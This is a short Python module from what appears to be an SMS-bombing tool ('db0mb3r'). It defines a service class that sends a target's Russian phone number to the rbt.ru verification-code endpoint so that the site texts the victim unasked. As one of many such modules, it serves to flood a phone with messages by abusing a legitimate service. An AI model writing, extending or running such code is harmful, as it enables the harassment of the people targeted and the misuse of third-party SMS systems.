from db0mb3r.services.service import Service


class Rbt(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://www.rbt.ru/user/sendCode/",
            data={"phone": self.format(self.formatted_phone, "+* (***) ***-**-**")},
        )
